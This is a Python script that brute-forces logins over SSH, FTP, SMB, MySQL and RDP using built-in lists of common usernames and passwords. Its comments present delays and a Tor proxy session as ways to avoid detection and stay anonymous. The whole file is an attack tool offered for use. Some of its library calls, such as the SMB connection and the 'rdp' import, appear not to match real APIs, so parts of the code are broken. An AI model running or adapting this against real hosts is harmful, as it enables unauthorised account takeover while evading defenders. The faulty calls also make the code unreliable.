import paramiko
from ftplib import FTP
import time
import random
import mysql.connector
from smbprotocol import SMBConnection
from stem import Signal
from stem.control import Controller
from requests import Session
from smbprotocol.connection import Connection

# Target details
TARGET_IP = "192.168.1.10"  # Change this to your target IP
SSH_PORT = 22  # SSH port
FTP_PORT = 21  # FTP port
SMB_PORT = 445  # SMB port
RDP_PORT = 3389  # RDP port
MYSQL_PORT = 3306  # MySQL port
NUM_TESTS = 5  # Number of tests for brute-force
RATE_LIMIT = 1  # Delay between each attempt to avoid detection
TIMEOUT = 5  # Timeout for connections

# List of common usernames and passwords (can be replaced with SecLists)
USERNAMES = ["admin", "root", "user", "guest", "test"]
PASSWORDS = ["123456", "password", "admin123", "toor", "letmein", "1234"]

# Proxy settings for Tor (to use for anonymity)
TOR_HOST = "127.0.0.1"
TOR_PORT = 9050

# Generate a random payload for fuzzing
def generate_random_payload(size=100):
    return bytes(random.choices(range(256), k=size))

# Set up a Tor session for anonymity (proxy rotation)
def get_tor_session():
    session = Session()
    session.proxies = {
        'http': f'socks5h://{TOR_HOST}:{TOR_PORT}',
        'https': f'socks5h://{TOR_HOST}:{TOR_PORT}'
    }
    return session

# SSH Brute Force function
def ssh_bruteforce(target_ip):
    print("[*] Starting SSH brute-force...")
    for username in USERNAMES:
        for password in PASSWORDS:
            print(f"[*] Trying {username}:{password}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(target_ip, port=SSH_PORT, username=username, password=password, timeout=TIMEOUT)
                print(f"[+] SUCCESS! SSH credentials found: {username}:{password}")
                ssh.close()
                return  # Stop if successful
            except paramiko.AuthenticationException:
                pass  # Continue if credentials are incorrect
            except Exception as e:
                print(f"[!] Error: {e}")
            time.sleep(RATE_LIMIT)  # Avoid triggering security mechanisms
    print("[X] SSH brute-force completed, no valid credentials found.")

# FTP Brute Force function
def ftp_bruteforce(target_ip):
    print("[*] Starting FTP brute-force...")
    ftp = FTP()
    try:
        ftp.connect(target_ip, FTP_PORT, timeout=TIMEOUT)

        for username in USERNAMES:
            for password in PASSWORDS:
                print(f"[*] Trying {username}:{password}")
                try:
                    ftp.login(username, password)
                    print(f"[+] SUCCESS! FTP credentials found: {username}:{password}")
                    ftp.quit()
                    return
                except Exception:
                    pass
                time.sleep(RATE_LIMIT)
        print("[X] FTP brute-force completed, no valid credentials found.")
    except Exception as e:
        print(f"[!] Error connecting to FTP: {e}")

# SMB Brute Force function
def smb_bruteforce(target_ip):
    print("[*] Starting SMB brute-force...")
    conn = SMBConnection(username="guest", password="guest", my_name="test", remote_name=target_ip, use_ntlm_v2=True)
    try:
        conn.connect(target_ip, SMB_PORT)
        for username in USERNAMES:
            for password in PASSWORDS:
                print(f"[*] Trying {username}:{password}")
                try:
                    conn.login(username, password)
                    print(f"[+] SUCCESS! SMB credentials found: {username}:{password}")
                    conn.close()
                    return
                except Exception:
                    pass
                time.sleep(RATE_LIMIT)
        print("[X] SMB brute-force completed, no valid credentials found.")
    except Exception as e:
        print(f"[!] Error connecting to SMB: {e}")

# MySQL Brute Force function
def mysql_bruteforce(target_ip):
    print("[*] Starting MySQL brute-force...")
    for username in USERNAMES:
        for password in PASSWORDS:
            print(f"[*] Trying {username}:{password}")
            try:
                conn = mysql.connector.connect(host=target_ip, port=MYSQL_PORT, user=username, password=password)
                if conn.is_connected():
                    print(f"[+] SUCCESS! MySQL credentials found: {username}:{password}")
                    conn.close()
                    return
            except mysql.connector.Error:
                pass
            time.sleep(RATE_LIMIT)
    print("[X] MySQL brute-force completed, no valid credentials found.")

# RDP Brute Force function
def rdp_bruteforce(target_ip):
    print("[*] Starting RDP brute-force...")
    from rdp import RdpConnection
    for username in USERNAMES:
        for password in PASSWORDS:
            print(f"[*] Trying {username}:{password}")
            try:
                rdp = RdpConnection(target_ip)
                rdp.connect(username, password)
                print(f"[+] SUCCESS! RDP credentials found: {username}:{password}")
                rdp.disconnect()
                return
            except Exception:
                pass
            time.sleep(RATE_LIMIT)
    print("[X] RDP brute-force completed, no valid credentials found.")

# Main function to run brute-force attacks
def main():
    print("[*] Starting network brute-forcing tool...")
    
    # Run brute-force for multiple services
    ssh_bruteforce(TARGET_IP)
    ftp_bruteforce(TARGET_IP)
    smb_bruteforce(TARGET_IP)
    mysql_bruteforce(TARGET_IP)
    rdp_bruteforce(TARGET_IP)

if __name__ == "__main__":
    main()